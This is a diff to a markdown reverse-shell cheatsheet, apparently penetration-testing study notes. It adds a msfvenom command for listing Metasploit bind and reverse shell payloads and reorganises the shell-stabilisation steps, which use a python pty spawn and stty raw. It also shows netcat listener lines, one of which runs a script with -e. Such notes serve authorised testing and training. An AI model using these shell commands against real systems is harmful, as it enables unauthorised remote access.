@@ -490,6 +490,11 @@ Reverse Shell Cheatsheet
 Reverse Shell Generator
 >https://www.revshells.com/
 
+Metasploit has several payloads under “cmd/unix” that can be used to generate one-liner bind or reverse shells:
+```shell
+msfvenom -l payloads | grep "cmd/unix"
+```
+
 ---
 
 ### Reverse Shell example
@@ -524,27 +529,6 @@ nc -lvnp <port> -e "cmd.sh"
 
 ## Stabilisation
 
-```
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
->have to explicitly state python,python2,python3
-
-```
-export TERM=xterm
-```
->this will give us access to term commands such as clear
-
-```
-^Z 
-```
->(press ctrl+Z to background the shell)
-```
-stty raw -echo; fg
-```
->foregrounds the shell gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes
-
----
-
 ### rlwrap listener & stabilization
 ```
 rlwrap nc -lvnp <port>
@@ -552,6 +536,22 @@ rlwrap nc -lvnp <port>
 >starts listener on host
 
 background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell. 
+
+---
+### Python stabilize
+
+
+1. have to explicitly state python,python2,python3
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+2. (press ctrl+Z to background the shell)
+3. Use `stty raw -echo` to give us access to term commands such as clear 
+4. reconnect to the shell through the listener
+5. Then use` export TERM=xterm
+
+
+
 
 ---
 
